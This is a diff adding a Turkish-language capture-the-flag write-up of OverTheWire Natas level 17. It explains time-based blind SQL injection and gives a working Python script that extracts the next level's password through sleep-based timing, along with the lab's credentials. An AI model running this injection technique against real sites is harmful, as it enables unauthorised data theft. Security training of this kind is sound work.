@@ -71,3 +71,37 @@ for i in range(32):
 >> natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 
 #### Level 17
+
+Level 15'in devamı niteliğinde.
+
+<figure>
+<img src="/assets/img/natas/natas171.png">
+</figure>
+
+Çıktı veren kısımlar yorum satırı haline getirilmiş. Time Based SQL Injection ile parolayı elde etmeyi deniyoruz.
+
+natas18 " and password LIKE BINARY "a%" and sleep(5) şeklinde bir payload girdiğimde natas18 kullanıcısına ait parolanın a ile başlaması halinde 3 saniyelik bir bekleme olucak.
+
+Benzer bir script çalıştırıyoruz.
+
+{% highlight python %}
+
+import requests
+from requests.auth import HTTPBasicAuth
+auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
+chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+passwd=""
+for i in range(32):
+       for char in chars:
+               payload = {'username' : 'natas18" and password LIKE BINARY "' +passwd + char + '%" and sleep(3) \x23'}
+               s=requests.post('http://natas17.natas.labs.overthewire.org/index.php',data=payload,auth=auth)
+               time=s.elapsed.total_seconds()
+               if time>1:
+                        passwd=passwd+char
+                        print passwd
+                        break
+{% endhighlight %}
+
+>> natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+#### Level 18
